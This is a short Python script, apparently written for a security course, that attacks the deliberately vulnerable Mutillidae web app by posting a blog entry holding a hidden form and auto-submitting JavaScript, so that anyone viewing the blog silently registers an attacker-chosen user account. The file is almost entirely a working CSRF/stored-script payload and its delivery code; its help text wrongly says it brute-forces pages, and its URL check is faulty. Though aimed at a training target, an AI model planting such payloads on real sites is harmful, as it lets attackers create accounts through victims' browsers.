
'''
Created on 11.09.2013

@author: Christoph (SPSE 1163)


you can find this file in my repo on bitbucket.org: 

https://bitbucket.org/chbb/spse/src/master/module4/owasp_a5_csrf.py?at=master

This is a small demo script for the mutillidae broken WebApp and the OWASP A5
Topic (Cross Site Request Forgery). It makes a blog entry with some javascript, 
which will create a new user if someone have a look at the blog entries.
'''
import argparse
from web import WebBrowser


def createBlogEntry(new_user, new_pass, signature):
    template = '''
        <form id="my-form" action="index.php?page=register.php" 
            method="post" enctype="application/x-www-form-urlencoded">
            <input type="hidden" name="username" value="{0}" />
            <input type="hidden" name="password" value="{1}" />
            <input type="hidden" name="confirm_password" value="{1}" />
            <input type="hidden" name="my_Signature" value="{2}" />
            <input type="hidden" name="register-php-submit-button" value="Create Account" />
        </form>
        <script>document.getElementById("my-form").submit()</script>
    '''
    script = template.format(new_user, new_pass, signature)
    blog_entry = "Hi ..." +script 
    return blog_entry

def postToBlog(base_url, new_user, new_pass, signature):
    text = createBlogEntry(new_user, new_pass, signature)
    br = WebBrowser()
    br.open(base_url + "/index.php?page=add-to-your-blog.php")
    f_nr =0
    for f in br.forms():
        if str(f.attrs["id"]) == "idBlogForm":
            break
        f_nr += 1
    br.select_form(nr=f_nr)
    br.form["blog_entry"] = text
    br.submit()
    br.close()
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="This tool will brute froce some secret pages")
    parser.add_argument("-u", "--url", required=True, 
                        help="the base url")
    parser.add_argument("--new_user", required=False, default="csrfuser", 
                        help="Username to use for new user")
    parser.add_argument("--new_pass", required=False, default="password",
                        help="Password to use for new user")
    parser.add_argument("--signature", required=False, default="Signature",
                        help="Signature to use for new user")
    args = parser.parse_args()
    
    if not args.url.startswith("http://") or args.url.startswith("https://"):
        args.url = "http://"+args.url
    postToBlog(args.url, args.new_user, args.new_pass, args.signature)
    